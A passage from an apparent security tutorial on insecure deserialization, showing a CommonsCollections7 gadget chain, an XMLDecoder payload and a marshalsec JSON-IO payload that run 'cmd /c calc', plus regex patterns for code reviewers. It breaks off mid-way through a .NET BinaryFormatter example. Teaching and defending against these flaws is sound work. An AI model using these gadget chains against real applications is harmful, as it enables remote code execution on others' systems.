        <span class="kd">final</span> <span class="n">Transformer</span> <span class="n">transformerChain</span> <span class="o">=</span> <span class="k">new</span> <span class="n">ChainedTransformer</span><span class="o">(</span><span class="k">new</span> <span class="n">Transformer</span><span class="o">[]{});</span>

        <span class="kd">final</span> <span class="n">Transformer</span><span class="o">[]</span> <span class="n">transformers</span> <span class="o">=</span> <span class="k">new</span> <span class="n">Transformer</span><span class="o">[]{</span>
            <span class="k">new</span> <span class="n">ConstantTransformer</span><span class="o">(</span><span class="n">Runtime</span><span class="o">.</span><span class="na">class</span><span class="o">),</span>
            <span class="k">new</span> <span class="n">InvokerTransformer</span><span class="o">(</span><span class="s">&quot;getMethod&quot;</span><span class="o">,</span>
                <span class="k">new</span> <span class="n">Class</span><span class="o">[]{</span><span class="n">String</span><span class="o">.</span><span class="na">class</span><span class="o">,</span> <span class="n">Class</span><span class="o">[].</span><span class="na">class</span><span class="o">},</span>
                <span class="k">new</span> <span class="n">Object</span><span class="o">[]{</span><span class="s">&quot;getRuntime&quot;</span><span class="o">,</span> <span class="k">new</span> <span class="n">Class</span><span class="o">[</span><span class="mi">0</span><span class="o">]}),</span>
            <span class="k">new</span> <span class="n">InvokerTransformer</span><span class="o">(</span><span class="s">&quot;invoke&quot;</span><span class="o">,</span>
                <span class="k">new</span> <span class="n">Class</span><span class="o">[]{</span><span class="n">Object</span><span class="o">.</span><span class="na">class</span><span class="o">,</span> <span class="n">Object</span><span class="o">[].</span><span class="na">class</span><span class="o">},</span>
                <span class="k">new</span> <span class="n">Object</span><span class="o">[]{</span><span class="kc">null</span><span class="o">,</span> <span class="k">new</span> <span class="n">Object</span><span class="o">[</span><span class="mi">0</span><span class="o">]}),</span>
            <span class="k">new</span> <span class="n">InvokerTransformer</span><span class="o">(</span><span class="s">&quot;exec&quot;</span><span class="o">,</span>
                <span class="k">new</span> <span class="n">Class</span><span class="o">[]{</span><span class="n">String</span><span class="o">.</span><span class="na">class</span><span class="o">},</span>
                <span class="n">execArgs</span><span class="o">),</span>
            <span class="k">new</span> <span class="n">ConstantTransformer</span><span class="o">(</span><span class="mi">1</span><span class="o">)};</span>

        <span class="n">Map</span> <span class="n">innerMap1</span> <span class="o">=</span> <span class="k">new</span> <span class="n">HashMap</span><span class="o">();</span>
        <span class="n">Map</span> <span class="n">innerMap2</span> <span class="o">=</span> <span class="k">new</span> <span class="n">HashMap</span><span class="o">();</span>

        <span class="c1">// Creating two LazyMaps with colliding hashes, in order to force element comparison during readObject</span>
        <span class="n">Map</span> <span class="n">lazyMap1</span> <span class="o">=</span> <span class="n">LazyMap</span><span class="o">.</span><span class="na">decorate</span><span class="o">(</span><span class="n">innerMap1</span><span class="o">,</span> <span class="n">transformerChain</span><span class="o">);</span>
        <span class="n">lazyMap1</span><span class="o">.</span><span class="na">put</span><span class="o">(</span><span class="s">&quot;yy&quot;</span><span class="o">,</span> <span class="mi">1</span><span class="o">);</span>

        <span class="n">Map</span> <span class="n">lazyMap2</span> <span class="o">=</span> <span class="n">LazyMap</span><span class="o">.</span><span class="na">decorate</span><span class="o">(</span><span class="n">innerMap2</span><span class="o">,</span> <span class="n">transformerChain</span><span class="o">);</span>
        <span class="n">lazyMap2</span><span class="o">.</span><span class="na">put</span><span class="o">(</span><span class="s">&quot;zZ&quot;</span><span class="o">,</span> <span class="mi">1</span><span class="o">);</span>

        <span class="c1">// Use the colliding Maps as keys in Hashtable</span>
        <span class="n">Hashtable</span> <span class="n">hashtable</span> <span class="o">=</span> <span class="k">new</span> <span class="n">Hashtable</span><span class="o">();</span>
        <span class="n">hashtable</span><span class="o">.</span><span class="na">put</span><span class="o">(</span><span class="n">lazyMap1</span><span class="o">,</span> <span class="mi">1</span><span class="o">);</span>
        <span class="n">hashtable</span><span class="o">.</span><span class="na">put</span><span class="o">(</span><span class="n">lazyMap2</span><span class="o">,</span> <span class="mi">2</span><span class="o">);</span>

        <span class="n">Reflections</span><span class="o">.</span><span class="na">setFieldValue</span><span class="o">(</span><span class="n">transformerChain</span><span class="o">,</span> <span class="s">&quot;iTransformers&quot;</span><span class="o">,</span> <span class="n">transformers</span><span class="o">);</span>

        <span class="c1">// Needed to ensure hash collision after previous manipulations</span>
        <span class="n">lazyMap2</span><span class="o">.</span><span class="na">remove</span><span class="o">(</span><span class="s">&quot;yy&quot;</span><span class="o">);</span>

        <span class="k">return</span> <span class="n">hashtable</span><span class="o">;</span>
    <span class="o">}</span>

    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">main</span><span class="o">(</span><span class="kd">final</span> <span class="n">String</span><span class="o">[]</span> <span class="n">args</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">Exception</span> <span class="o">{</span>
        <span class="n">PayloadRunner</span><span class="o">.</span><span class="na">run</span><span class="o">(</span><span class="n">CommonsCollections7</span><span class="o">.</span><span class="na">class</span><span class="o">,</span> <span class="n">args</span><span class="o">);</span>
    <span class="o">}</span>
<span class="o">}</span>
</pre></div>
Let&rsquo;s dissect the above code:</p>
<ol>
<li>Using <code>readObject()</code>, the JVM looks for the serialized Object&rsquo;s class in the ClassPath. <ul>
<li>Class not found -&gt; throws  exception(ClassNotFoundException)</li>
<li>Class found -&gt;  java.util.Hashmap.reconsitutionPut is called </li>
</ul>
</li>
<li>We forced a hash collision, so a comparison is issued using <code>equals</code></li>
<li>The decorator forwards the method to the AbstractMap -&gt; lazyMap</li>
<li>The lazyMap attempts to retrieve a value with a key equal to the &ldquo;map&rdquo;</li>
<li>Since that key does not exist, the lazyMap instance goes ahead and tries to create a new key</li>
<li>Since a chainedTransformer is set to execute during the key creation process, the chained transformer with the malicious payload is invoked, leading to remote code execution.</li>
</ol>
<h4 id="java-text-based-seriliazation-archive">Java: Text-based Seriliazation Archive<a class="headerlink" href="#java-text-based-seriliazation-archive" title="Permanent link"></a></h4>
<p>Of course, this issue doesn&rsquo;t affect just the binary archive format, but can be extended to text-based serialization archives. As we said, the most common formats used are XML and JSON.</p>
<p><strong>XML</strong></p>
<p>XML Serialization/Deserialization is offered, among others, by the XMLEncoder/XMLDecoder and XStream classes. These classes are known to be susceptible to deserialisation issues leading to RCE.</p>
<p>Let&rsquo;s consider the following example:</p>
<div class="codehilite"><pre><span class="kn">import</span> <span class="nn">java.beans.XMLDecoder</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">java.io.BufferedInputStream</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">java.io.FileInputStream</span><span class="o">;</span>

<span class="kd">public</span> <span class="kd">class</span> <span class="nc">DesertXML</span> <span class="o">{</span>

    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">main</span><span class="o">(</span><span class="n">String</span><span class="o">[]</span> <span class="n">args</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">Exception</span> <span class="o">{</span>

        <span class="n">XMLDecoder</span> <span class="n">decoder</span> <span class="o">=</span> <span class="k">new</span> <span class="n">XMLDecoder</span><span class="o">(</span><span class="k">new</span> <span class="n">BufferedInputStream</span><span class="o">(</span><span class="k">new</span> <span class="n">FileInputStream</span><span class="o">(</span><span class="s">&quot;desert.xml&quot;</span><span class="o">)));</span>

        <span class="c1">// Deserialise object from XML</span>
        <span class="n">Object</span> <span class="n">desert</span> <span class="o">=</span> <span class="n">decoder</span><span class="o">.</span><span class="na">readObject</span><span class="o">();</span>
        <span class="n">decoder</span><span class="o">.</span><span class="na">close</span><span class="o">();</span>

        <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="s">&quot;The desert: &quot;</span> <span class="o">+</span> <span class="o">((</span><span class="n">Desert</span><span class="o">)</span><span class="n">desert</span><span class="o">).</span><span class="na">getName</span><span class="o">());</span>
        <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="s">&quot;Has a surface of: &quot;</span> <span class="o">+</span> <span class="n">String</span><span class="o">.</span><span class="na">valueOf</span><span class="o">(((</span><span class="n">Desert</span><span class="o">)</span><span class="n">desert</span><span class="o">).</span><span class="na">getWidth</span><span class="o">()*((</span><span class="n">Desert</span><span class="o">)</span><span class="n">desert</span><span class="o">).</span><span class="na">getHeight</span><span class="o">())</span> <span class="o">);</span>

    <span class="o">}</span>

    <span class="kd">public</span> <span class="kd">static</span> <span class="kd">class</span>  <span class="nc">Desert</span> <span class="o">{</span>

        <span class="kd">private</span> <span class="n">String</span> <span class="n">name</span><span class="o">;</span>
        <span class="kd">private</span> <span class="kt">int</span> <span class="n">width</span><span class="o">;</span>
        <span class="kd">private</span> <span class="kt">int</span> <span class="n">height</span><span class="o">;</span>

        <span class="cm">/**</span>
<span class="cm">         * Getters and Setters</span>
<span class="cm">         */</span>
        <span class="kd">public</span> <span class="n">String</span> <span class="nf">getName</span><span class="o">()</span> <span class="o">{</span>
            <span class="k">return</span> <span class="n">name</span><span class="o">;</span>
        <span class="o">}</span>
        <span class="kd">public</span> <span class="kt">void</span> <span class="nf">setName</span><span class="o">(</span><span class="n">String</span> <span class="n">name</span><span class="o">)</span> <span class="o">{</span>
            <span class="k">this</span><span class="o">.</span><span class="na">name</span> <span class="o">=</span> <span class="n">name</span><span class="o">;</span>
        <span class="o">}</span>
        <span class="kd">public</span> <span class="kt">int</span> <span class="nf">getWidth</span><span class="o">()</span> <span class="o">{</span>
            <span class="k">return</span> <span class="n">width</span><span class="o">;</span>
        <span class="o">}</span>
        <span class="kd">public</span> <span class="kt">void</span> <span class="nf">setWidth</span><span class="o">(</span><span class="kt">int</span> <span class="n">width</span><span class="o">)</span> <span class="o">{</span>
            <span class="k">this</span><span class="o">.</span><span class="na">width</span> <span class="o">=</span> <span class="n">width</span><span class="o">;</span>
        <span class="o">}</span>
        <span class="kd">public</span> <span class="kt">int</span> <span class="nf">getHeight</span><span class="o">()</span> <span class="o">{</span>
            <span class="k">return</span> <span class="n">height</span><span class="o">;</span>
        <span class="o">}</span>
        <span class="kd">public</span> <span class="kt">void</span> <span class="nf">setHeight</span><span class="o">(</span><span class="kt">int</span> <span class="n">height</span><span class="o">)</span> <span class="o">{</span>
            <span class="k">this</span><span class="o">.</span><span class="na">height</span> <span class="o">=</span> <span class="n">height</span><span class="o">;</span>
        <span class="o">}</span>    
    <span class="o">}</span>
<span class="o">}</span>
</pre></div>

<p>The application mainly tries to instantiate the same object class we saw in the previous example, by loading it from an external XML file. Instead of an XML parsing routing, the <code>readObject()</code> is called from the <code>XMLDecoder</code> class.</p>
<p>As we already know, the general concept behind deserialization is to trick the application into loading arbitrary object, in a way we can use them to execute arbitrary code. So, in this case, how can we exploit this situation to achieve RCE?</p>
<p>The task is simple, we just need to tell the application to load well know classes used by java to interact with the OS, such as <code>java.lang.Runtime</code> or <code>java.lang.ProcessBuilder</code>. By using this classes, the application would kindly start new processes for us. An example payload would be the following:</p>
<div class="codehilite"><pre><span class="cp">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span>
<span class="nt">&lt;java</span> <span class="na">version=</span><span class="s">&quot;1.8.0_241&quot;</span> <span class="na">class=</span><span class="s">&quot;java.beans.XMLDecoder&quot;</span><span class="nt">&gt;</span>
 <span class="nt">&lt;void</span> <span class="na">class=</span><span class="s">&quot;java.lang.ProcessBuilder&quot;</span><span class="nt">&gt;</span>
   <span class="nt">&lt;array</span> <span class="na">class=</span><span class="s">&quot;java.lang.String&quot;</span> <span class="na">length=</span><span class="s">&quot;3&quot;</span><span class="nt">&gt;</span>
          <span class="nt">&lt;void</span> <span class="na">index=</span><span class="s">&quot;0&quot;</span><span class="nt">&gt;</span>
              <span class="nt">&lt;string&gt;</span>cmd<span class="nt">&lt;/string&gt;</span>
          <span class="nt">&lt;/void&gt;</span>
          <span class="nt">&lt;void</span> <span class="na">index=</span><span class="s">&quot;1&quot;</span><span class="nt">&gt;</span>
              <span class="nt">&lt;string&gt;</span>/c<span class="nt">&lt;/string&gt;</span>
          <span class="nt">&lt;/void&gt;</span>
          <span class="nt">&lt;void</span> <span class="na">index=</span><span class="s">&quot;2&quot;</span><span class="nt">&gt;</span>
              <span class="nt">&lt;string&gt;</span>calc<span class="nt">&lt;/string&gt;</span>
          <span class="nt">&lt;/void&gt;</span>
      <span class="nt">&lt;/array&gt;</span>
    <span class="nt">&lt;void</span> <span class="na">method=</span><span class="s">&quot;start&quot;</span> <span class="na">id=</span><span class="s">&quot;process&quot;</span><span class="nt">&gt;</span>
    <span class="nt">&lt;/void&gt;</span>
  <span class="nt">&lt;/void&gt;</span>
<span class="nt">&lt;/java&gt;</span>
</pre></div>

<p><strong>JSON</strong></p>
<p>Of course, JSON format is not free from this kind of vulnerability. The main problem with JSON, however, is that quite a lot of libraries exist for JAVA which supports automatic serialization/deserialization. The one I will take as example is JsonIO. </p>
<p>The code for the deserializer is following:</p>
<p><div class="codehilite"><pre><span class="kd">public</span> <span class="kd">class</span> <span class="nc">DesertJSON</span> <span class="o">{</span>

    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">main</span><span class="o">(</span><span class="n">String</span><span class="o">[]</span> <span class="n">args</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">Exception</span> <span class="o">{</span>

        <span class="c1">// Read JSON as a string</span>
        <span class="n">String</span> <span class="n">json</span> <span class="o">=</span> <span class="k">new</span> <span class="n">String</span><span class="o">(</span><span class="n">Files</span><span class="o">.</span><span class="na">readAllBytes</span><span class="o">(</span><span class="n">Paths</span><span class="o">.</span><span class="na">get</span><span class="o">(</span><span class="s">&quot;desert.json&quot;</span><span class="o">)));</span>
        <span class="c1">// Deserialising        </span>
        <span class="n">Object</span> <span class="n">desert</span> <span class="o">=</span> <span class="n">JsonReader</span><span class="o">.</span><span class="na">jsonToJava</span><span class="o">(</span><span class="n">json</span><span class="o">);</span>

        <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="s">&quot;The desert: &quot;</span> <span class="o">+</span> <span class="o">((</span><span class="n">Desert</span><span class="o">)</span><span class="n">desert</span><span class="o">).</span><span class="na">getName</span><span class="o">());</span>
        <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="s">&quot;Has a surface of: &quot;</span> <span class="o">+</span> <span class="n">String</span><span class="o">.</span><span class="na">valueOf</span><span class="o">(((</span><span class="n">Desert</span><span class="o">)</span><span class="n">desert</span><span class="o">).</span><span class="na">getWidth</span><span class="o">()*((</span><span class="n">Desert</span><span class="o">)</span><span class="n">desert</span><span class="o">).</span><span class="na">getHeight</span><span class="o">())</span> <span class="o">);</span>
    <span class="o">}</span>

    <span class="kd">public</span> <span class="kd">static</span> <span class="kd">class</span>  <span class="nc">Desert</span> <span class="o">{</span>

        <span class="kd">private</span> <span class="n">String</span> <span class="n">name</span><span class="o">;</span>
        <span class="kd">private</span> <span class="kt">int</span> <span class="n">width</span><span class="o">;</span>
        <span class="kd">private</span> <span class="kt">int</span> <span class="n">height</span><span class="o">;</span>

        <span class="cm">/**</span>
<span class="cm">         * Getters and Setters</span>
<span class="cm">         */</span>
        <span class="kd">public</span> <span class="n">String</span> <span class="nf">getName</span><span class="o">()</span> <span class="o">{</span>
            <span class="k">return</span> <span class="n">name</span><span class="o">;</span>
        <span class="o">}</span>
        <span class="kd">public</span> <span class="kt">void</span> <span class="nf">setName</span><span class="o">(</span><span class="n">String</span> <span class="n">name</span><span class="o">)</span> <span class="o">{</span>
            <span class="k">this</span><span class="o">.</span><span class="na">name</span> <span class="o">=</span> <span class="n">name</span><span class="o">;</span>
        <span class="o">}</span>
        <span class="kd">public</span> <span class="kt">int</span> <span class="nf">getWidth</span><span class="o">()</span> <span class="o">{</span>
            <span class="k">return</span> <span class="n">width</span><span class="o">;</span>
        <span class="o">}</span>
        <span class="kd">public</span> <span class="kt">void</span> <span class="nf">setWidth</span><span class="o">(</span><span class="kt">int</span> <span class="n">width</span><span class="o">)</span> <span class="o">{</span>
            <span class="k">this</span><span class="o">.</span><span class="na">width</span> <span class="o">=</span> <span class="n">width</span><span class="o">;</span>
        <span class="o">}</span>
        <span class="kd">public</span> <span class="kt">int</span> <span class="nf">getHeight</span><span class="o">()</span> <span class="o">{</span>
            <span class="k">return</span> <span class="n">height</span><span class="o">;</span>
        <span class="o">}</span>
        <span class="kd">public</span> <span class="kt">void</span> <span class="nf">setHeight</span><span class="o">(</span><span class="kt">int</span> <span class="n">height</span><span class="o">)</span> <span class="o">{</span>
            <span class="k">this</span><span class="o">.</span><span class="na">height</span> <span class="o">=</span> <span class="n">height</span><span class="o">;</span>
        <span class="o">}</span>    
    <span class="o">}</span>
<span class="o">}</span>
</pre></div>
JSON-IO allows to specify the type of the object to be deserialized within the JSON body, using the <code>@type</code> key. The concept is the same as the other type of deserialization issues, we need just to find a POP chain to achieve RCE. </p>
<p>In <a href="https://github.com/no-sec-marko/marshalsec/blob/master/marshalsec.pdf">this</a> research, M. Becheler, enumerates various JSON libraries and each method used for RCE exploitation. As part of the research, he provided an interesting tool, to automatically generates payloads for these libraries. For example, let&rsquo;s consider the following payload then:</p>
<div class="codehilite"><pre><span class="nv">$ </span>java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.JsonIO Groovy <span class="s2">&quot;cmd&quot;</span> <span class="s2">&quot;/c&quot;</span> <span class="s2">&quot;calc&quot;</span>

<span class="o">{</span><span class="s2">&quot;@type&quot;</span>:<span class="s2">&quot;java.util.Arrays</span><span class="nv">$ArrayList</span><span class="s2">&quot;</span>,<span class="s2">&quot;@items&quot;</span>:<span class="o">[{</span><span class="s2">&quot;@id&quot;</span>:2,<span class="s2">&quot;@type&quot;</span>:<span class="s2">&quot;groovy.util.Expando&quot;</span>,<span class="s2">&quot;expandoProperties&quot;</span>:<span class="o">{</span><span class="s2">&quot;@type&quot;</span>:<span class="s2">&quot;java.util.HashMap&quot;</span>,<span class="s2">&quot;hashCode&quot;</span>:<span class="o">{</span><span class="s2">&quot;@type&quot;</span>:<span class="s2">&quot;org.codehaus.groovy.runtime.MethodClosure&quot;</span>,<span class="s2">&quot;method&quot;</span>:<span class="s2">&quot;start&quot;</span>,<span class="s2">&quot;delegate&quot;</span>:<span class="o">{</span><span class="s2">&quot;@id&quot;</span>:1,<span class="s2">&quot;@type&quot;</span>:<span class="s2">&quot;java.lang.ProcessBuilder&quot;</span>,<span class="s2">&quot;command&quot;</span>:<span class="o">{</span><span class="s2">&quot;@type&quot;</span>:<span class="s2">&quot;java.util.ArrayList&quot;</span>,<span class="s2">&quot;@items&quot;</span>:<span class="o">[</span><span class="s2">&quot;cmd&quot;</span>,<span class="s2">&quot;/c&quot;</span>,<span class="s2">&quot;calc&quot;</span><span class="o">]}</span>,<span class="s2">&quot;directory&quot;</span>:null,<span class="s2">&quot;environment&quot;</span>:null,<span class="s2">&quot;redirectErrorStream&quot;</span>:false,<span class="s2">&quot;redirects&quot;</span>:null<span class="o">}</span>,<span class="s2">&quot;owner&quot;</span>:<span class="o">{</span><span class="s2">&quot;@ref&quot;</span>:1<span class="o">}</span>,<span class="s2">&quot;thisObject&quot;</span>:null,<span class="s2">&quot;resolveStrategy&quot;</span>:0,<span class="s2">&quot;directive&quot;</span>:0,<span class="s2">&quot;parameterTypes&quot;</span>:<span class="o">[]</span>,<span class="s2">&quot;maximumNumberOfParameters&quot;</span>:0,<span class="s2">&quot;bcw&quot;</span>:null<span class="o">}}}</span>,<span class="o">{</span><span class="s2">&quot;@type&quot;</span>:<span class="s2">&quot;java.util.HashMap&quot;</span>,<span class="s2">&quot;@keys&quot;</span>:<span class="o">[{</span><span class="s2">&quot;@ref&quot;</span>:2<span class="o">}</span>,<span class="o">{</span><span class="s2">&quot;@ref&quot;</span>:2<span class="o">}]</span>,<span class="s2">&quot;@items&quot;</span>:<span class="o">[{</span><span class="s2">&quot;@ref&quot;</span>:2<span class="o">}</span>,<span class="o">{</span><span class="s2">&quot;@ref&quot;</span>:2<span class="o">}]}]}</span>
</pre></div>

<p><strong>Tips for Source Code reviewers</strong></p>
<p>To find this kind of vulnerability it is usually enough to search the code for common regexes, like: </p>
<ul>
<li><code>.*readObject\(.*</code></li>
<li><code>java.beans.XMLDecoder</code></li>
<li><code>com.thoughtworks.xstream.XStream</code></li>
<li><code>.*\.fromXML\(.*\)</code></li>
<li><code>com.esotericsoftware.kryo.io.Input</code></li>
<li><code>.readClassAndObject\(.*</code></li>
<li><code>.readObjectOrNull\(.*</code></li>
<li><code>com.caucho.hessian.io</code></li>
<li><code>com.caucho.burlap.io.BurlapInput</code></li>
<li><code>com.caucho.burlap.io.BurlapOutput</code></li>
<li><code>org.codehaus.castor</code></li>
<li><code>Unmarshaller</code></li>
<li><code>jsonToJava\(.*</code></li>
<li><code>JsonObjectsToJava\/.*</code></li>
<li><code>JsonReader</code></li>
<li><code>ObjectMapper\(</code></li>
<li><code>enableDefaultTyping\(\s*\)</code></li>
<li><code>@JsonTypeInfo\(</code></li>
<li><code>readValue\(.*\,\s*Object\.class</code></li>
<li><code>com.alibaba.fastjson.JSON</code></li>
<li><code>JSON.parseObject</code></li>
<li><code>com.owlike.genson.Genson</code></li>
<li><code>useRuntimeType</code></li>
<li><code>genson.deserialize</code></li>
<li><code>org.red5.io</code></li>
<li><code>deserialize\(.*\,\s*Object\.class</code></li>
<li><code>\.Yaml</code></li>
<li><code>\.load\(.*</code></li>
<li><code>\.loadType\(.*\,\s*Object\.class</code></li>
<li><code>YamlReader</code></li>
<li><code>com.esotericsoftware.yamlbeans</code></li>
</ul>
<p>For each match, the code should be manually inspected to see whether the object being deserialized can be manipulated by an external attacker.</p>
<p><strong>Additional Affected Libraries</strong></p>
<p>As previously said, through the years, many other libraries had been found to be affected by this vulnerability. While exploring all of them is outside the bounds of this post, following a list of additional resource, which can be use to further explore this fascinating issue:</p>
<ul>
<li><a href="https://www.contrastsecurity.com/security-influencers/serialization-must-die-act-1-kryo-serialization">Kryo</a></li>
<li><a href="http://www.pwntester.com/blog/2013/12/23/rce-via-xstream-object-deserialization38/">XStream</a></li>
<li><a href="http://codewhitesec.blogspot.ru/2017/04/amf.html">AMF</a></li>
<li><a href="https://www.github.com/mbechler/marshalsec/blob/master/marshalsec.pdf">YAML and Other</a></li>
</ul>
<p>For additional references and a safe playground to exercise with this kind of vulnerabilities, my friend and colleague <strong>Nick Bloor</strong> developed a fantastic vulnerable Lab, called <a href="https://github.com/NickstaDB/DeserLab">DeserLab</a>.</p>
<p>If that was not enough, he developed a set of fantastic tools to aid with Java deserialization identification and exploitation:</p>
<ul>
<li><a href="https://github.com/NickstaDB/SerializationDumper">SerializationDumper</a></li>
<li><a href="https://github.com/NickstaDB/SerialBrute">SerialBrute</a></li>
<li><a href="https://github.com/NickstaDB/BaRMIe">BaRMIe</a></li>
</ul>
<p>Nick is an expert code reviewer and one of the major experts about JAVA deserialization issues, you can find out more about his work <a href="https://www.cognitous.co.uk/">here</a>.</p>
<h4 id="references">References<a class="headerlink" href="#references" title="Permanent link"></a></h4>
<p>Any relevant reference for JAVA has been presented within the document.</p>
<h3 id="net">.NET<a class="headerlink" href="#net" title="Permanent link"></a></h3>
<p>.NET, as JAVA, has developed over the years different mechanism to support object serialization. As Java, the primary archive formats are:</p>
<ul>
<li>Binary</li>
<li>XML</li>
<li>JSON</li>
</ul>
<h4 id="net-binary-archive-format">.NET: Binary Archive Format<a class="headerlink" href="#net-binary-archive-format" title="Permanent link"></a></h4>
<p>In .NET, Binary serialization is mainly provided by <code>System.Runtime.Serialization.Binary.BinaryFormatter</code>. This class can virtually serialize ANY type which is marked as [Serializable] or which directly implements the ISerializable interface (allowing custom serialization).</p>
<p>The following C# code can be used to serialize/deserialize the class Desert (similarly to the JAVA examples):</p>
<div class="codehilite"><pre><span class="k">using</span> <span class="nn">System</span><span class="p">;</span>
<span class="k">using</span> <span class="nn">System.IO</span><span class="p">;</span>
<span class="k">using</span> <span class="nn">System.Runtime.Serialization</span><span class="p">;</span>
<span class="k">using</span>
<span class="nn">System.Runtime.Serialization.Formatters.Binary</span><span class="p">;</span>
<span class="k">namespace</span> <span class="nn">BinarySerialization</span>
<span class="p">{</span>
    <span class="k">public</span> <span class="k">static</span> <span class="k">class</span> <span class="nc">BinarySerialization</span>
    <span class="p">{</span>
        <span class="k">private</span> <span class="k">const</span> <span class="kt">string</span> <span class="n">filename</span> <span class="p">=</span> <span class="s">&quot;desert.ser&quot;</span><span class="p">;</span>
<span class="na">        [STAThread]</span>
        <span class="k">static</span> <span class="k">void</span> <span class="nf">Main</span><span class="p">(</span><span class="kt">string</span><span class="p">[]</span> <span class="n">args</span><span class="p">)</span>
        <span class="p">{</span>
            <span class="n">Console</span><span class="p">.</span><span class="n">WriteLine</span><span class="p">();</span>

            <span class="kt">bool</span> <span class="n">deserialize</span> <span class="p">=</span> <span class="k">false</span><span class="p">;</span>
            <span class="k">if</span> <span class="p">(</span><span class="n">deserialize</span><span class="p">)</span>
            <span class="p">{</span>
                <span class="n">BinarySerialization</span><span class="p">.</span><span class="n">desertDeserial</span><span class="p">(</span><span class="n">filename</span><span class="p">);</span>
            <span class="p">}</span>
            <span class="k">else</span>
            <span class="p">{</span>
                <span class="c1">// Delete old file, if it exists</span>
                <span class="n">BinarySerialization</span><span class="p">.</span><span class="n">deleteFile</span><span class="p">(</span><span class="n">filename</span><span class="p">);</span>
                <span class="n">BinarySerialization</span><span class="p">.</span><span class="n">desertSerial</span><span class="p">(</span><span class="n">filename</span><span class="p">);</span>
            <span class="p">}</span>
            <span class="n">Console</span><span class="p">.</span><span class="n">WriteLine</span><span class="p">();</span>
            <span class="n">Console</span><span class="p">.</span><span class="n">WriteLine</span><span class="p">(</span><span class="s">&quot;Press Enter Key&quot;</span><span class="p">);</span>
            <span class="n">Console</span><span class="p">.</span><span class="n">Read</span><span class="p">();</span>
        <span class="p">}</span>

        <span class="k">public</span> <span class="k">static</span> <span class="k">void</span> <span class="nf">deleteFile</span><span class="p">(</span><span class="kt">string</span> <span class="n">filname</span><span class="p">)</span>
        <span class="p">{</span>
            <span class="k">if</span> <span class="p">(</span><span class="n">File</span><span class="p">.</span><span class="n">Exists</span><span class="p">(</span><span class="n">filename</span><span class="p">))</span>
            <span class="p">{</span>
                <span class="n">Console</span><span class="p">.</span><span class="n">WriteLine</span><span class="p">(</span><span class="s">&quot;Deleting old file&quot;</span><span class="p">);</span>
                <span class="n">File</span><span class="p">.</span><span class="n">Delete</span><span class="p">(</span><span class="n">filename</span><span class="p">);</span>
            <span class="p">}</span>
        <span class="p">}</span>

        <span class="k">public</span> <span class="k">static</span> <span class="k">void</span> <span class="nf">desertDeserial</span><span class="p">(</span><span class="kt">string</span> <span class="n">filename</span><span class="p">)</span>
        <span class="p">{</span>
            <span class="kt">var</span> <span class="n">formatter</span> <span class="p">=</span> <span class="k">new</span> <span class="n">BinaryFormatter</span><span class="p">();</span>
            <span class="c1">// Open stream for reading</span>
            <span class="n">FileStream</span> <span class="n">stream</span> <span class="p">=</span> <span class="n">File</span><span class="p">.</span><span class="n">OpenRead</span><span class="p">(</span><span class="n">filename</span><span class="p">);</span>
            <span class="n">Console</span><span class="p">.</span><span class="n">WriteLine</span><span class="p">(</span><span class="s">&quot;Deserializing string&quot;</span><span class="p">);</span>
            <span class="c1">// Deserializing</span>
            <span class="kt">var</span> <span class="n">desert</span> <span class="p">=</span> <span class="p">(</span><span class="n">Desert</span><span class="p">)</span><span class="n">formatter</span><span class="p">.</span><span class="n">Deserialize</span><span class="p">(</span><span class="n">stream</span><span class="p">);</span>
            <span class="n">stream</span><span class="p">.</span><span class="n">Close</span><span class="p">();</span>
        <span class="p">}</span>

        <span class="k">public</span> <span class="k">static</span> <span class="k">void</span> <span class="nf">desertSerial</span><span class="p">(</span><span class="kt">string</span> <span class="n">filename</span><span class="p">)</span>
        <span class="p">{</span>
            <span class="c1">// Create desert name</span>
            <span class="kt">var</span> <span class="n">desert</span> <span class="p">=</span> <span class="k">new</span> <span class="n">Desert</span><span class="p">();</span>
            <span class="n">desert</span><span class="p">.</span><span class="n">name</span> <span class="p">=</span> <span class="s">&quot;Gobi&quot;</span><span class="p">;</span>
            <span class="c1">// Persist to file</span>
            <span class="n">FileStream</span> <span class="n">stream</span> <span class="p">=</span> <span class="n">File</span><span class="p">.</span><span class="n">Create</span><span class="p">(</span><span class="n">filename</span><span class="p">);</span>
            <span class="kt">var</span> <span class="n">formatter</span> <span class="p">=</span> <span class="k">new</span> <span class="n">BinaryFormatter</span><span class="p">();</span>
            <span class="n">Console</span><span class="p">.</span><span class="n">WriteLine</span><span class="p">(</span><span class="s">&quot;Serializing desert&quot;</span><span class="p">);</span>
            <span class="n">formatter</span><span class="p">.</span><span class="n">Serialize</span><span class="p">(</span><span class="n">stream</span><span class="p">,</span> <span class="n">desert</span><span class="p">);</span>
            <span class="n">stream</span><span class="p">.</span><span class="n">Close</span><span class="p">();</span>
        <span class="p">}</span>
    <span class="p">}</span>

<span class="na">    [Serializable]</span>
    <span class="k">public</span> <span class="k">class</span> <span class="nc">RCE</span> <span class="p">:</span> <span class="n">IDeserializationCallback</span>
    <span class="p">{</span>
        <span class="k">private</span> <span class="n">String</span> <span class="n">_cmd</span><span class="p">;</span>
        <span class="k">public</span> <span class="n">String</span> <span class="n">cmd</span>
        <span class="p">{</span>
            <span class="k">get</span> <span class="p">{</span> <span class="k">return</span> <span class="n">_cmd</span><span class="p">;</span> <span class="p">}</span>
            <span class="k">set</span>
            <span class="p">{</span>
                <span class="n">_cmd</span> <span class="p">=</span> <span class="k">value</span><span class="p">;</span>
                <span class="n">run</span><span class="p">();</span>
            <span class="p">}</span>
        <span class="p">}</span>

